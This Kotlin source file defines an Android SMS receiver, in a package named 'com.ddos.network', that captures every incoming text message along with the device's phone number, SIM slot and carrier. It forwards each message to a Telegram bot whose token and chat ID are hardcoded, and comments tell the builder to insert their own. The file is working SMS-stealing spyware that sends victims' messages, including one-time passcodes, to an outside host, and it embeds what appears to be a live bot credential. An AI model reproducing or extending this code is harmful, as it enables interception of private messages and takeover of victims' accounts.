package com.ddos.network

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SubscriptionManager

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

            for (sms in messages) {
                val sender = sms.originatingAddress ?: "Unknown"
                val body = sms.messageBody ?: ""
                val time = sms.timestampMillis

                // Get SIM info
                val simInfo = getSimInfo(context)

                // 🔴 BOT TOKEN YAHAN DAALO
                val bot = TelegramBot(
                    "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg",  // ← YAHAN APNA TOKEN DAALO
                    "8507217564",    // ← YAHAN APNA CHAT ID DAALO
                    context
                )

                bot.sendSms(
                    sender = sender,
                    body = body,
                    time = time,
                    simSlot = simInfo.first,
                    phoneNumber = simInfo.second,
                    carrier = simInfo.third
                )
            }
        }
    }

    private fun getSimInfo(context: Context): Triple<Int, String, String> {
        return try {
            val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager

            if (android.os.Build.VERSION.SDK_INT >= 22) {
                val activeSubscription = subManager.activeSubscriptionInfoList?.firstOrNull()

                if (activeSubscription != null) {
                    val slot = activeSubscription.simSlotIndex
                    val number = activeSubscription.number ?: "Unknown"
                    val carrier = activeSubscription.carrierName?.toString() ?: "Unknown"

                    Triple(slot, number, carrier)
                } else {
                    Triple(0, "Unknown", "Unknown")
                }
            } else {
                Triple(0, "Unknown", "Unknown")
            }
        } catch (e: Exception) {
            Triple(0, "Permission denied", "Unknown")
        }
    }
}
